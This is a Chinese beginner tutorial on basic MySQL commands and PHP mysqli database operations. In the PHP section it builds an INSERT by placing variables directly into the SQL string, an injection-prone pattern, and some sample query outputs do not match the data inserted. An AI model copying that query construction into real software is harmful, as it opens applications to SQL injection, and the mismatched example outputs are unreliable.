<p><strong>create database if not exists XX(数据库名);</strong> #尝试创一个test的数据库试试</p>
<p>会出现<strong>Query ok,1 row affected ,1 warning.</strong></p>
<p>显示“OK”，没有报错了，但是有一个警告，这个警告就是告诉用户，”test“这个数据库存在。</p>
<p>现在让我们尝试一下创建一个关键字的数据库，</p>
<p><strong>create database create;</strong></p>
<p>会出现<strong>You have an error in your SQL syntax;check the manual that correspands to your ……………….to use near ‘create’ at line 1</strong> 这里我们可以确实看到的是，名为“create”的这个数据库没有创建成功，报错了.</p>
<p>那如果有的人说我就想创建一个名为“create”的数据库，下面给出解决办法</p>
<p>**create database <code>XX</code>(数据库名);(**注意，这里``是反引号，在键盘tab上面,1的旁边)</p>
<p>这样操作就可以创建一个名叫做create的数据库了，但是最好不要起这些关键字名字，不好区别。</p>
<h5 id="4-显示数据库信息"><a href="#4-显示数据库信息" class="headerlink" title="4.显示数据库信息"></a>4.显示数据库信息</h5><p><strong>show create database XX(数据库名);</strong></p>
<p>查看信息。CHARACTER SET</p>
<p>当然在这里你可以修改你的字符编码。使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alter database dbname CHARACTER SET utf8 COLLATE utf8_general_ci;</span><br><span class="line">utf8_general_ci这是一个校对规则。</span><br><span class="line"></span><br><span class="line">然后在使用哪个查看数据库就可以看到，你的数据库的编码就变成了utf8;</span><br></pre></td></tr></table></figure>
<h5 id="5-删除数据库"><a href="#5-删除数据库" class="headerlink" title="5.删除数据库"></a>5.删除数据库</h5><p><strong>drop database XX(数据库名);</strong></p>
<p>删除了会显示</p>
<p><strong>Query ok, 0 rows affected</strong> #这样就显示删除成功了。</p>
<p>但是如果我们要删除一个并不存在的数据库会出现什么呢</p>
<p>删除一个不存在的q数据库。回车显示</p>
<p><strong>can’t drop database ‘q’; database doesno’t exist</strong></p>
<p>很明显，报错了，因为不存在“a”这个数据库，我们可以判断一下，这个数据库存在才删除，下面给出代码。跟创建一样的</p>
<p><strong>drop database if exists XX (数据库名字);</strong></p>
<p>会显示</p>
<p>Query OK, 0 rows affected, 1 warning (0.01 sec)</p>
<p>和之前创建一样，虽然是成功的，但是有警告。警告的意思大概是说，么有这个数据库，。。</p>
<h5 id="6-选择数据库"><a href="#6-选择数据库" class="headerlink" title="6.选择数据库"></a>6.选择数据库</h5><p>这是数据库的最后一个基本操作，我们如果想要创建数据，必须要创建一个数据库，然后在数据库当中创建数据表，在数据表中进行操作，</p>
<p>但是这么多数据库，计算机怎么知道我们选择的是哪个数据库呢？我们使用下列语句</p>
<p><strong>use XX(数据库名);</strong></p>
<p>回车后会显示</p>
<p><strong>Database changed</strong></p>
<p>这个就提示你已经进入到了这个XX数据库里面了。然后你就可以操作了。</p>
<h3 id="数据表"><a href="#数据表" class="headerlink" title="数据表"></a>数据表</h3><p>数据表的基本操作全都是在选择了数据库的前提下,一定要在选择了数据库的前提下。</p>
<h5 id="1-创建表"><a href="#1-创建表" class="headerlink" title="1.创建表"></a>1.创建表</h5><p><strong>create table XX(表名)(</strong><br><strong>字段1名 数据类型，</strong><br><strong>字段2名 数据类型,</strong><br><strong>…….</strong><br><strong>字段n名 数据类型</strong><br><strong>);</strong></p>
<p>这个创建表可以打个比方，如果要你用Excel做一份班级成绩表，你会怎么做？肯定先有个标题吧，比方说“18级网络二班期末成绩表”，这里的标题就相当于我们的表名。标题有了，我们得在第一行写上“学号”、“姓名”、“总成绩”吧，来告诉看这个表的人，每一列代表的什么东西，这里的“学号”、“姓名”、“总成绩”就相当于我们的字段名。到这里，都这应该对这段代码有所了解了，下面我们创建一个数据表。</p>
<p><strong>My</strong>SQL [qq1]&gt; create table stu(<br><strong>-&gt; id varchar(20),</strong><br><strong>-&gt; name varchar(10),</strong><br><strong>-&gt; score int</strong><br>-&gt; );</p>
<p>回车之后显示</p>
<p><strong>Query OK, 0 rows affected (0.09 sec)</strong></p>
<p>表示已经成功创建一个表了。这里注意写一行别忘记 , 和最后的 ；不然出错了又要重新敲一次。</p>
<p>这里讲一讲mysql数据类型的知识。</p>
<p>数据类型：int 整型<br>tinyint 整型（0-256）<br>decimal 浮点型（总位数，小数位数） 例如 decimal(3,1)<br>char(X) 定长字符型 例如 char(10)<br>varchar(X) 可变长度字符型 例如varchar（10）<br>text 大段文本</p>
<p> binary 二进制（存储照片等）</p>
<p>和C语言类似。</p>
<p>字段属性：</p>
<p>null:空<br>not null:不为空<br>default ‘XXXX’：默认值<br>auto_increment：自动增长<br>primary key：主键(主键的特点，不为空，不重复,一个表只能有一个主键，但是一个主键可以由多个列组成)</p>
<p>具体的没必要多说，只要了解常用的数据类型即可。现在我可以讲讲“Latin”和“utf8”的区别了，如果是在“Latin”字符下创建的数据表，那么一个中文等于两个字符，也就相当于，如果名字是四个字，就要char（8）。但如果是在“utf8”字符下创建的数据表，一个中文等于一个字符，如果名字是四个字，只需要char（4）就够了。</p>
<p>还有如果你还是要用关键字创建字段名或者表名的话，和之前一样要用``</p>
<h5 id="2-查看表"><a href="#2-查看表" class="headerlink" title="2.查看表"></a>2.查看表</h5><p><strong>show tables;</strong></p>
<p>一定要是tables，因为一个MySQL里面有多个数据库，所以，一个数据库里面也可以有多个表，当然，一个表里面也可以有多个数据，但是只有一个表的话，也要使用tables，也可以使用后面的显示创建的表。</p>
<p>回车之后会显示你刚刚创建的表</p>
<p>+—————+<br>| Tables_in_qq1 |<br>+—————+<br>| stu |<br>+—————+<br>1 row in set (0.00 sec)</p>
<h5 id="3-显示创建表"><a href="#3-显示创建表" class="headerlink" title="3.显示创建表"></a>3.显示创建表</h5><p><strong>show create table XX(表名);</strong><br><strong>show create table XX(表名) \G;</strong></p>
<p>上面两段代码都是显示创建表，只不过显示的样式不同，随意选择一种即可</p>
<p>上面那种会显示</p>
<p>+——-+————————————————————————————————————————————————————-+</p>
<table>
<thead>
<tr>
<th align="left">Table</th>
<th align="left">Create Table</th>
</tr>
</thead>
<tbody><tr>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">+——-+————————————————————————————————————————————————————–+</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">stu</td>
<td align="left">CREATE TABLE <code>stu</code> (</td>
</tr>
<tr>
<td align="left"><code>id</code> varchar(20) DEFAULT NULL,</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>name</code> varchar(10) DEFAULT NULL,</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>score</code> int(11) DEFAULT NULL</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">) ENGINE=InnoDB DEFAULT CHARSET=utf8</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">+——-+————————————————————————————————————————————————————–+</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">1 row in set (0.00 sec)</td>
<td align="left"></td>
</tr>
</tbody></table>
<p>下面那种会显示</p>
<p><strong><em>*</em>*****************\</strong>*** 1. row <strong><em>*</em>*****************\</strong>***<br>Table: stu<br>Create Table: CREATE TABLE <code>stu</code> (<br><code>id</code> varchar(20) DEFAULT NULL,<br><code>name</code> varchar(10) DEFAULT NULL,<br><code>score</code> int(11) DEFAULT NULL<br>) ENGINE=InnoDB DEFAULT CHARSET=utf8<br>1 row in set (0.00 sec)</p>
<p><strong>ERROR:</strong><br><strong>No query specified</strong></p>
<p>##记得百度ERROR；</p>
<h5 id="4-显示表的结构"><a href="#4-显示表的结构" class="headerlink" title="4.显示表的结构"></a>4.显示表的结构</h5><p><strong>describe(或desc) XX(表名);</strong></p>
<p>回车之后会显示刚刚我创建的表的结构</p>
<p>+——-+————-+——+—–+———+——-+<br>| Field | Type | Null | Key | Default | Extra |<br>+——-+————-+——+—–+———+——-+<br>| id | varchar(20) | YES | | NULL | |<br>| name | varchar(10) | YES | | NULL | |<br>| score | int(11) | YES | | NULL | |<br>+——-+————-+——+—–+———+——-+<br>3 rows in set (0.00 sec)</p>
<p>解释每个表头的含义</p>
<p>其中 id ,name,score都是字段，然后varchar什么的都是字段的内型。</p>
<p>因为现在什么都没有写进去，所以是空的。key是说是不是主键。</p>
<h5 id="5-删除表"><a href="#5-删除表" class="headerlink" title="5.删除表"></a>5.删除表</h5><p><strong>drop table XX(表名);</strong><br>*<em>drop table XX,XX,XX……;</em></p>
<p>在这里因为后面还要用到表，我们只创建了一个表，所以我们再创建一个表，</p>
<p><strong>My</strong>SQL [qq1]&gt; create table stu1(<br><strong>-&gt; id varchar(20),</strong><br><strong>-&gt; name varchar(10),</strong><br><strong>-&gt; score int</strong><br>-&gt; );</p>
<p>来演示删除</p>
<p>创建好了之后查看一下表的多少（show tables;）。</p>
<p>回车之后显示</p>
<p><strong>Query OK, 0 rows affected (0.04 sec)</strong> #表示删除成功。</p>
<p>我们再来查看一下表。发现少了一个，表示删除成功。</p>
<h3 id="数据的基本操作"><a href="#数据的基本操作" class="headerlink" title="数据的基本操作"></a>数据的基本操作</h3><p>数据的操作算是整个MySQL中最复杂的部分，虽然概括起来无非就是“增删查改”，但每一项底下包含的内容非常之多，我比较菜，所以尽力而为。</p>
<h4 id="1-插入数据"><a href="#1-插入数据" class="headerlink" title="1.插入数据"></a>1.插入数据</h4><p>这个要在表的底下实现，<strong>所以要先有个表</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into XX（表名） (字段1,字段2,字段3......) values (值1,值2,值3.......);</span><br></pre></td></tr></table></figure>
<p>比如在自己的stu表中插入一些信息</p>
<p><strong>insert into stu (id,name,score) values(“201801”,”某某”,90);</strong></p>
<p>千万要注意不要写入中文符号，不然会报错，千万千万。</p>
<p>回车之后有下面一段代码，显示成功插入数据</p>
<p><strong>Query OK, 1 row affected (0.00 sec)</strong></p>
<p>我们再插入几条信息</p>
<p><strong>insert into stu (id,name,score) values(“201820”,”嘿嘿”,70);</strong></p>
<p>insert into stu (id,name,score) values(“201830”,”lala”,90);</p>
<p>然后看下面的查询数据</p>
<h4 id="2-查询数据"><a href="#2-查询数据" class="headerlink" title="2.查询数据"></a>2.查询数据</h4><p>让大家看一下插入数据之后，表内变成什么样了，</p>
<p>首先给大家介绍一个知识点——运算符<br>比较运算符 &gt;、&gt;=、&lt;、&lt;=、=（比较和赋值都是”=”）、&lt;&gt;（不等于）</p>
<p>逻辑运算符 非（not） and（与）or（或）</p>
<p>和C语言差不多，但是有的有区别，不要混淆。</p>
<h6 id="1、查询一个表里面的数据"><a href="#1、查询一个表里面的数据" class="headerlink" title="1、查询一个表里面的数据"></a>1、查询一个表里面的数据</h6><p><strong>select * from XX（表名）;</strong></p>
<p>我们 来查询刚刚创建的表的数据</p>
<p><strong>select * from stu;</strong></p>
<p>回车显示内容</p>
<p>+——–+——–+——-+<br>| id | name | score |<br>+——–+——–+——-+<br>| 201801 | 某某 | 90 |<br>| 201810 | 啥啥 | 80 |<br>| 201810 | 啥啥 | 80 |<br>| 201820 | 嘿嘿 | 70 |<br>+——–+——–+——-+<br>4 rows in set (0.00 sec)</p>
<h6 id="2、查询一个表里面某字段-的所有数据"><a href="#2、查询一个表里面某字段-的所有数据" class="headerlink" title="2、查询一个表里面某字段 的所有数据"></a>2、查询一个表里面某字段 的所有数据</h6><p>select 字段1,字段2,字段3……（或用”*”代替所有字段） from XX（表名）;</p>
<p>举个例子，我们查询“id”字段底下所有的数据，那么”id“下有哪些数据，就会展现出来</p>
<p><strong>select id from stu;</strong></p>
<p>回车显示这个表里面id字段下的所有的数据</p>
<p>+——–+<br>| id |<br>+——–+<br>| 201801 |<br>| 201810 |<br>| 201810 |<br>| 201820 |<br>+——–+<br>4 rows in set (0.00 sec)</p>
<h6 id="3-我们也可以根据条件来查询信息"><a href="#3-我们也可以根据条件来查询信息" class="headerlink" title="3.我们也可以根据条件来查询信息"></a>3.我们也可以根据条件来查询信息</h6><p><strong>select * from XX（表名）where 字段1 = 值1 and 字段2 = 值2 and ……;</strong></p>
<p>例如我们来查询stu里面name是某某的并且score是90的人</p>
<p><strong>select * from stu where score =90 and name=”某某”;</strong></p>
<p>回车显示内容</p>
<p>+——–+——–+——-+<br>| id | name | score |<br>+——–+——–+——-+<br>| 201801 | 某某 | 90 |<br>+——–+——–+——-+<br>1 row in set (0.02 sec)</p>
<h6 id="4-我们也可以搜索"><a href="#4-我们也可以搜索" class="headerlink" title="4.我们也可以搜索"></a>4.我们也可以搜索</h6><p><strong>select * from stu where score &gt; 90 or score &lt; 60;</strong></p>
<p>这个就是查找表中分数在90以上或者60以下的人</p>
<p>要是没有的话，就会显示这段信息。</p>
<p><strong>Empty set (0.00 sec)</strong></p>
<p>这个就是查找表中分数在80以上或者60以下的人</p>
<p>+——–+——–+——-+<br>| id | name | score |<br>+——–+——–+——-+<br>| 201801 | 某某 | 90 |<br>+——–+——–+——-+<br>1 row in set (0.00 sec)</p>
<h6 id="5-对数据进行排序"><a href="#5-对数据进行排序" class="headerlink" title="5.对数据进行排序"></a>5.对数据进行排序</h6><p><strong>select * from XX（表名） order by 字段x asc;（默认就是升序，低————高）</strong></p>
<p>这里演示一个按照id序号来排序。</p>
<p><strong>select * from stu order by id asc;</strong></p>
<p>回车之后显示</p>
<p>+——–+——–+——-+<br>| id | name | score |<br>+——–+——–+——-+<br>| 201801 | 某某 | 90 |<br>| 201810 | 啥啥 | 80 |<br>| 201810 | 啥啥 | 80 |<br>| 201820 | 嘿嘿 | 70 |<br>+——–+——–+——-+</p>
<p><strong>select * from XX（表名） order by 字段x desc;</strong> （高———低）</p>
<p><strong>select * from XX（表名） where 字段x = 值x oreder by 字段x asc(desc);</strong> （按照某种条件排序）</p>
<p><strong>select * from XX（表名） limit n;</strong> （取前n条数据）</p>
<p>下面演示一个取前两条数据</p>
<p><strong>select * from stu limit 2;</strong></p>
<p>回车之后显示</p>
<p>+——–+——–+——-+<br>| id | name | score |<br>+——–+——–+——-+<br>| 201801 | 某某 | 90 |<br>| 201810 | 啥啥 | 80 |<br>+——–+——–+——-+<br>2 rows in set (0.00 sec)</p>
<p>其他的就不举例了。自己可以试一试。</p>
<p><strong>select * from XX（表名） limit n,m;</strong> （从第n条开始取m条数据 ）</p>
<p>*<em>select \</em> from XX（表名） order by 字段x asc(desc) limit n;**（取某种排序下的前n条数据）</p>
<h4 id="3-删除数据"><a href="#3-删除数据" class="headerlink" title="3.删除数据"></a>3.删除数据</h4><p><strong>delete from XX（表名） where 字段x = 值x;</strong></p>
<p>举例说明</p>
<p><strong>delete from stu where id=201801;</strong></p>
<p>回车之后，在查询表中的数据，看是不是少了第一条信息，</p>
<p><strong>select * from stu;</strong></p>
<p>回车之后发现少了哪一行id=201801的数据。这样就删除数据成功了。</p>
<p>然后在使用select * from stu;</p>
<p>来看看自己是否真的删除成功了，</p>
<p>+——–+——–+——-+<br>| id | name | score |<br>+——–+——–+——-+<br>| 201810 | 啥啥 | 80 |<br>| 201810 | 啥啥 | 80 |<br>| 201820 | 嘿嘿 | 70 |<br>+——–+——–+——-+<br>3 rows in set (0.01 sec)</p>
<h4 id="4-修改数据"><a href="#4-修改数据" class="headerlink" title="4.修改数据"></a>4.修改数据</h4><p><strong>update XX（表名） set 字段1 = 值1,字段2 = 值2 where 条件;</strong><br><strong>update XX（表名） set 字段1 = 值1;</strong></p>
<p>下面一条的作用是修改某一字段的所有值，所以不需要加条件。</p>
<p>实例</p>
<p><strong>update stu set id = 201710,name = “啦啦” where id = 201810 ;</strong></p>
<p>回车之后显示</p>
<p><strong>Query OK, 2 rows affected (0.01 sec)</strong><br><strong>Rows matched: 2 Changed: 2 Warnings: 0</strong></p>
<p>表示修改成功。</p>
<p>然后我们再来查询一下表的信息。</p>
<p><strong>select * from stu;</strong></p>
<p>回车之后显示</p>
<p><strong>+——–+——–+——-+</strong></p>
<table>
<thead>
<tr>
<th align="left"><strong>id</strong></th>
<th align="left"><strong>name</strong></th>
<th align="left"><strong>score</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><strong>+——–+——–+——-+</strong></td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="left"><strong>201710</strong></th>
<th align="left"><strong>啦啦</strong></th>
<th align="left"><strong>80</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><strong>201710</strong></td>
<td align="left"><strong>啦啦</strong></td>
<td align="left"><strong>80</strong></td>
</tr>
<tr>
<td align="left">———-</td>
<td align="left">——–</td>
<td align="left">——</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><strong>201820</strong></td>
<td align="left"><strong>嘿嘿</strong></td>
<td align="left"><strong>70</strong></td>
</tr>
<tr>
<td align="left">———-</td>
<td align="left">——–</td>
<td align="left">——</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><strong>+——–+——–+——-+</strong></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">3 rows in set (0.00 sec)</td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table>
<p>注意这里的第一条信息，已经改变了。</p>
<h4 id="然后我们就可以在phpstrom中尝试这些语句，看是不是一样的。"><a href="#然后我们就可以在phpstrom中尝试这些语句，看是不是一样的。" class="headerlink" title="然后我们就可以在phpstrom中尝试这些语句，看是不是一样的。"></a>然后我们就可以在phpstrom中尝试这些语句，看是不是一样的。</h4><h3 id="php部分"><a href="#php部分" class="headerlink" title="php部分"></a><strong>php部分</strong></h3><p><strong>入门</strong></p>
<p>①PHP中的变量，声明与使用，必须使用$开头。</p>
<p>②PHP是一种弱类型语言，变量其实并不需要声明，可以直接给变量赋任何类型的值；</p>
<p>③PHP中可以使用连等同时声明多个变量。而不能使用逗号分隔。</p>
<p>eg：$num1=$num2=$num3=5;</p>
<p>④常用变量函数：</p>
<p>unset()：删除并释放变量；</p>
<p>isset()：检测变量是否设置；</p>
<p>empty()：检测变量是否为空（未设置或值为Null都算空）；</p>
<p>⑤变量的命名：只能有字母数字下划线组成，开头不能是数字。而且，PHP中变量区分大小写！！<br>$name,$Nnme,$NAME都是不同变量；</p>
<p>但是，PHP的内置函数不区分大小写！echo EcHo都是有效的。</p>
<h4 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h4><p>这里面有[不再使用mysql_connect()来连接数据库]的解释</p>
<p>因为他 会显示 <strong>不推荐使用mysql扩展，将来会删除它</strong></p>
<p>本扩展自 PHP 5.5.0 起已废弃，并在将来会被移除。应使用 <a href="http://php.net/manual/zh/book.mysqli.php">MySQLi</a> 或 <a href="http://php.net/manual/zh/ref.pdo-mysql.php">PDO_MySQL</a> 扩展来替换之。参见 <a href="http://php.net/manual/zh/mysqlinfo.api.choosing.php">MySQL：选择 API</a> 指南以及<a href="http://php.net/manual/zh/faq.databases.php#faq.databases.mysql.deprecated">相关 FAQ</a> 以获取更多信息</p>
<p>详情请了解下面。</p>
<p><a href="https://www.cnblogs.com/wangtao_20/p/4823088.html">https://www.cnblogs.com/wangtao_20/p/4823088.html</a></p>
<p>连接解释：</p>
<p>mysqli_connect_errno() 返回一个整数，标识连接数据库是否成功和各种错误的数值。</p>
<p>mysqli_connect_error() 返回连接错误信息。</p>
<p>以下是一些连接情况：</p>
<p><strong>mysqli_connect_errno</strong> <strong>mysqli_connect_error</strong></p>
<p>2002 php_network_getaddresses: getaddrinfo failed: 不知道这样的主机。</p>
<p>1045 Access denied for user ‘wjj’@’localhost’ (using password: YES)</p>
<p>1049 Unknown database ‘test’</p>
<p>0(连接成功) null</p>
<h5 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h5><p>语句：**$sql=’CREATE DATABASE aa ‘;**<br>create database大小写都可以，</p>
<p><strong>PHP 使用 mysqli_query 函数来创建或者删除 MySQL 数据库。</strong><br><strong>该函数有两个参数，在执行成功时返回 TRUE，否则返回 FALSE。</strong></p>
<h5 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h5><p>语句：**$sql=’DROP DATABASE aa ‘;**</p>
<p>在使用PHP脚本删除数据库时，不会出现确认是否删除信息，会直接删除指定数据库，所以你在删除数据库时要特别小心。千万小心。</p>
<h5 id="选择数据库"><a href="#选择数据库" class="headerlink" title="选择数据库"></a>选择数据库</h5><p>语句：<strong>mysqli_select_db($conn,’aa’);</strong><br>aa是指你选择的数据库名字，这个操作简单，不演示了。</p>
<h5 id="创建数据表"><a href="#创建数据表" class="headerlink" title="创建数据表"></a>创建数据表</h5><p>语句：</p>
<p><strong>$s</strong>ql=”CREATE TABLE bb_1(“.**<br><strong>“bb_id INT NOT NULL AUTO_INCREMENT,”.</strong><br><strong>“bb_title VARCHAR(100) NOT NULL,”.</strong><br><strong>“bb_name VARCHAR(40) NOT NULL,”.</strong><br><strong>“bb_data DATE, “.</strong><br>“PRIMARY KEY(bb_id))ENGINE=InnoDB DEFAULT CHARSET=utf8;”;**</p>
<p>一定要看清楚括号和, .;不要少一个多一个，</p>
<p>PRIMARY KEY(bb_id)主键是Id</p>
<p>AUTO_INCREMENT的意思是自己增加，id自己增加，这样方便一点。</p>
<p>ENGINE=InnoDB 表示将数据库的引擎设置为InnoDB,从MySQL 5.6开始默认使用该引擎。</p>
<p>DEFAULT CHARSET=utf8 表示设置数据库的默认字符集为utf8</p>
<h5 id="删除数据表"><a href="#删除数据表" class="headerlink" title="删除数据表"></a>删除数据表</h5><p><strong>语句：$sql=”DROP TABLE bb_1”;</strong></p>
<p> <strong>mysqli_select_db($conn,’aa’);</strong></p>
<p>一定不要忘记写这一句mysqli_select_db($conn,’aa’);</p>
<p>这一句的意思是说在这个aa数据库里面删除bb_1的数据表。</p>
<h5 id="在数据表里面插入数据"><a href="#在数据表里面插入数据" class="headerlink" title="在数据表里面插入数据"></a>在数据表里面插入数据</h5><p>语句：</p>
<p><strong>$sql=”INSERT INTO bb_1”.</strong></p>
<p> <strong>“(bb_title,bb_name,bb_data)”.</strong><br><strong>​<br>​ “VALUES”.</strong><br><strong>​<br>​ “(‘$bb_title’,’$bb_name’,’$bb_data’)”;</strong><br>​<br>​ 可以多插入几条数据，一样的形式，修改数据就好了。<br>​<br>​ 然后就可以在你的数据库里面看到这些数据了。<br>​<br>​<br>​<br>​</p>
<h5 id="查询数据1-1"><a href="#查询数据1-1" class="headerlink" title="查询数据1.1"></a>查询数据1.1</h5><p>语句： <strong>$sql=’SELECT bb_id,bb_title,bb_name,bb_data FROM bb_1’;</strong></p>
<p>bb_id,bb_title,bb_name,bb_data都是字段</p>
<p>bb_1是数据表名。</p>
<p>一定要注意括号一对一对的写，不要忘记html代码的连续性。</p>
<p>在上面的例子中，PHP mysqli_fetch_array() 函数第二个参数为 <strong>MYSQLI_ASSOC</strong>，<br>设置该参数查询结果返回<strong>关联数组</strong></p>
<p>PHP 提供了另外一个函数 <strong>mysqli_fetch_assoc()</strong>, 该函数从结果集中取得一行作为关联数组。<br>返回根据从结果集取得的行生成的关联数组，如果没有更多行，则返回 false。</p>
<p>在我们执行完 SELECT 语句后，释放游标内存是一个很好的习惯。</p>
<p>可以通过 PHP 函数 mysqli_free_result() 来实现内存的释放。</p>
<p>游标内存：存储Select的查询结果，并用来遍历。</p>
<h5 id="查询数据1-2"><a href="#查询数据1-2" class="headerlink" title="查询数据1.2"></a>查询数据1.2</h5><p>语句：**$sql=’SELECT bb_id,bb_title,bb_name,bb_data FROM bb_1 WHERE bb_id=”2”‘;**</p>
<p>WHERE相当于一个限制条件。比如这里面的只能是id 为2的数据被查出来。</p>
<h5 id="查询数据1-3"><a href="#查询数据1-3" class="headerlink" title="查询数据1.3"></a>查询数据1.3</h5><p>模糊查询</p>
<p>LIKE的使用。</p>
<p>语句：</p>
<p><strong>$sql=’SELECT bb_id,bb_title,bb_name,bb_data FROM bb_1</strong><br><strong>WHERE bb_name LIKE “%学习”‘;</strong></p>
<p>还有一些用法</p>
<p>‘%a’ //以a结尾的数据</p>
<p>‘a%’ //以a开头的数据</p>
<p>‘%a%’ //含有a的数据</p>
<p>‘<em>a</em>‘ //三位且中间字母是a的</p>
<p>‘<em>_a’ //两位且结尾字母是a的</em></p>
<p>‘a_’ //两位且开头字母是a的</p>
<h5 id="查询数据1-3-1"><a href="#查询数据1-3-1" class="headerlink" title="查询数据1.3"></a>查询数据1.3</h5><p>语句：</p>
<p><strong>$sql=’SELECT bb_id,bb_title,bb_name,bb_data</strong><br><strong>FROM bb_1</strong><br><strong>ORDER BY bb_data ASC’;</strong></p>
<p>按照时间的顺序排序。输出。</p>
<p>其他的和数据测试的一样。</p>
<h5 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h5><p>语句：</p>
<p><strong>$sql=’UPDATE bb_1</strong><br><strong>SET bb_name=”谁呀”</strong><br><strong>WHERE bb_id=2’;</strong></p>
<p>WHERE是一个限制条件；</p>
<p>可以这样理解：update 表名称 set 列名称 = 新值 where 更新条件;</p>
<h5 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h5><p>语句：</p>
<p><strong>$sql=’DELETE FROM bb_1</strong><br><strong>WHERE bb_id=3’;</strong></p>
<p>delete，drop，truncate 都有删除表的作用，区别在于：</p>
<ul>
<li>1、delete 和 truncate 仅仅删除表数据，drop 连表数据和表结构一起删除，打个比</li>
<li>方，delete 是单杀，truncate 是团灭，drop 是把电脑摔了。</li>
<li>2、delete 是 DML 语句，操作完以后如果没有不想提交事务还可以回滚，truncate 和</li>
<li>drop 是 DDL 语句，操作完马上生效，不能回滚，打个比方，delete 是发微信说分手，</li>
<li>后悔还可以撤回，truncate 和 drop 是直接扇耳光说滚，不能反悔。</li>
<li>3、执行的速度上，<strong>drop&gt;truncate&gt;delete</strong>，打个比方，drop 是神舟火箭，truncate</li>
<li>是和谐号动车，delete 是自行车。</li>
</ul>
<p>好了，到此结束，感谢大家。</p>
<p>参考链接：<a href="https://blog.csdn.net/qq_37236745/article/details/78694768">https://blog.csdn.net/qq_37236745/article/details/78694768</a></p>
<p>参考：菜鸟教程。</p>
]]></content>
      <categories>
        <category>Note</category>
        <category>Mysql</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
</search>
